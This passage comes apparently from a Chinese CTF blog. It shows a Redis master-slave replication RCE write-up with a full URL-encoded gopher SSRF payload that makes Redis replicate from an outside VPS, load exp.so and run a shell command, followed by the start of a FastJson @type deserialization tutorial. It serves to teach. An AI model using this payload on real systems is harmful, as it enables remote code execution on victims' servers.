title="主从复制rce"></a>主从复制rce</h1><p>在docker环境下，一个单一的容器中不会有除redis以外的任何服务存在，如ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下可以利用主从复制执行命令。</p><p><strong>主从复制概念</strong></p><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。建立主从关系只需要在从节点操作就行了，主节点不用任何操作。</p><p><strong>主从复制作用</strong></p><p>Redis是一个使用ANSI  C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>还是以[网鼎杯 2020 玄武组]SSRFMe为例</p><p>需要先下载两个工具</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a> </p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>实际用到的只有第一个链接中的<code>rogue-server.py</code>和<code>ssrf-redis.py</code>，还有第二个链接中的<code>exp.so</code>，把这三个文件放到一个文件夹里即可</p><p>修改ssrf-redis.py中的一些参数</p><p>lhost改为vps地址，6666端口为<code>rogue-server.py</code>的运行端口，command为要执行的命令</p><p><img src="https://www.hualigs.cn/image/6086b21e6139f.jpg"></p><p>ip改为符合要求的0.0.0.0</p><p><img src="https://www.hualigs.cn/image/6086b21e55ef0.jpg"></p><p>密码改为root</p><p><img src="https://www.hualigs.cn/image/6086b21e568de.jpg"></p><p>生成payload</p><p><img src="https://www.hualigs.cn/image/6086b21e71a9a.jpg"></p><p>运行rogue-server.py，建立从节点</p><p><img src="https://www.hualigs.cn/image/6086b21e662b0.jpg"></p><p>将生成的payload进行url编码后访问，得到flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">44677</span>c<span class="hljs-number">4</span>e-<span class="hljs-number">0255</span>-<span class="hljs-number">433</span>c-aa<span class="hljs-number">69</span>-f<span class="hljs-number">1</span>ebedb<span class="hljs-number">79</span>c<span class="hljs-number">08</span>.node<span class="hljs-number">3</span>.buuoj.cn/?url=gopher://<span class="hljs-number">0.0.0.0:6379</span>/_%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">41</span>%<span class="hljs-number">55</span>%<span class="hljs-number">54</span>%<span class="hljs-number">48</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">72</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">37</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">53</span>%<span class="hljs-number">4</span>c%<span class="hljs-number">41</span>%<span class="hljs-number">56</span>%<span class="hljs-number">45</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">46</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">31</span>%<span class="hljs-number">31</span>%<span class="hljs-number">38</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">31</span>%<span class="hljs-number">39</span>%<span class="hljs-number">35</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">31</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">31</span>%<span class="hljs-number">33</span>%<span class="hljs-number">38</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">43</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">4</span>e%<span class="hljs-number">46</span>%<span class="hljs-number">49</span>%<span class="hljs-number">47</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">53</span>%<span class="hljs-number">45</span>%<span class="hljs-number">54</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">64</span>%<span class="hljs-number">69</span>%<span class="hljs-number">72</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">35</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">6</span>e%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">67</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">65</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">30</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">64</span>%<span class="hljs-number">62</span>%<span class="hljs-number">66</span>%<span class="hljs-number">69</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">65</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">73</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">33</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">36</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">4</span>d%<span class="hljs-number">4</span>f%<span class="hljs-number">44</span>%<span class="hljs-number">55</span>%<span class="hljs-number">4</span>c%<span class="hljs-number">45</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">4</span>c%<span class="hljs-number">4</span>f%<span class="hljs-number">41</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">74</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">70</span>%<span class="hljs-number">2</span>e%<span class="hljs-number">73</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">32</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">73</span>%<span class="hljs-number">79</span>%<span class="hljs-number">73</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">6</span>d%<span class="hljs-number">2</span>e%<span class="hljs-number">65</span>%<span class="hljs-number">78</span>%<span class="hljs-number">65</span>%<span class="hljs-number">63</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">31</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">63</span>%<span class="hljs-number">61</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">42</span>%<span class="hljs-number">49</span>%<span class="hljs-number">46</span>%<span class="hljs-number">53</span>%<span class="hljs-number">25</span>%<span class="hljs-number">37</span>%<span class="hljs-number">44</span>%<span class="hljs-number">2</span>f%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">41</span>%<span class="hljs-number">31</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">25</span>%<span class="hljs-number">32</span>%<span class="hljs-number">34</span>%<span class="hljs-number">34</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">69</span>%<span class="hljs-number">74</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">44</span>%<span class="hljs-number">25</span>%<span class="hljs-number">30</span>%<span class="hljs-number">41</span><br></code></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/6086b21e68121.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FastJson反序列化</title>
    <link href="/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2021/04/25/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson使用"><a href="#Fastjson使用" class="headerlink" title="Fastjson使用"></a>Fastjson使用</h1><p>astjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java  Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。</p><p>pom.xml设置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>先定义一个User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>FastJson反序列化有三种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        User user=<span class="hljs-keyword">new</span> User();<br>        user.setName(<span class="hljs-string">&quot;admin&quot;</span>);<br>        user.setAge(<span class="hljs-number">14</span>);<br><br>        <span class="hljs-comment">//序列化</span><br>        String serializedStr=JSON.toJSONString(user);<br>        System.out.println(serializedStr);<br><br>        <span class="hljs-comment">//反序列化</span><br>        Object obj1=JSON.parse(serializedStr);<br>        System.out.println(<span class="hljs-string">&quot;通过parse方法反序列化&quot;</span>);<br>        System.out.println(obj1.getClass().getName());<br>        System.out.println(obj1);<br><br>        Object obj2=JSON.parseObject(serializedStr);<br>        System.out.println(<span class="hljs-string">&quot;通过parseObject方法，不指定类进行反序列化&quot;</span>);<br>        System.out.println(obj2.getClass().getName());<br>        System.out.println(obj2);<br><br>        Object obj3=JSON.parseObject(serializedStr,User.class);<br>        System.out.println(<span class="hljs-string">&quot;通过parseObject方法，指定User类进行反序列化&quot;</span>);<br>        System.out.println(obj3.getClass().getName());<br>        System.out.println(obj3);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>执行结果如下</p><p><img src="https://www.hualigs.cn/image/608577ba949d7.jpg"></p><p>可以看到<code>JSON.parse</code>和未指定对象的<code>JSON.parseObject</code>都会返回<code>JSONObject</code>，而<code>JSON.parseObject</code>指定类后会返回相应的类对象。它们不仅返回结果不同，执行过程中调用的方法也不同。</p><h1 id="type字段"><a href="#type字段" class="headerlink" title="type字段"></a>type字段</h1><p>修改User类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> age;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(<span class="hljs-keyword">int</span> age)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-keyword">this</span>.age = age;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> FastJson中有一个特殊字段<code>type</code>，这个字段可以指定反序列化任意类，并且会自动调用类中符合规则的特定的<code>setter</code>和<code>getter</code>方法。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">parse</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span></span> 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法<br><br><span class="hljs-function"><span class="hljs-title">parseObject</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span></span> 会调用反序列化目标类的特定 setter 和 getter 方法<br><br><span class="hljs-function"><span class="hljs-title">parseObject</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>,class)</span></span> 会识别并调用目标类的特定 setter 方法及某些特定条件的 getter 方法<br></code></pre></td></tr></table></figure><p>规则</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">set开头的方法要求如下：<br><span class="hljs-bullet">- </span>方法名长度大于4且以set开头，且第四个字母要是大写<br><span class="hljs-bullet">- </span>非静态方法<br><span class="hljs-bullet">- </span>返回类型为void或当前类<br><span class="hljs-bullet">- </span>参数个数为1个<br>get开头的方法要求如下：<br><span class="hljs-bullet">- </span>方法名长度大于等于4        <br><span class="hljs-bullet">- </span>非静态方法<br><span class="hljs-bullet">- </span>以get开头且第4个字母为大写<br><span class="hljs-bullet">- </span>无传入参数<br><span class="hljs-bullet">- </span>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong<br></code></pre></td></tr></table></figure><p>Demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br><br>        String jsonstring=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;User\&quot;,\&quot;age\&quot;:80,\&quot;name\&quot;:\&quot;admin\&quot;&#125;&quot;</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;parse:&quot;</span>);<br>        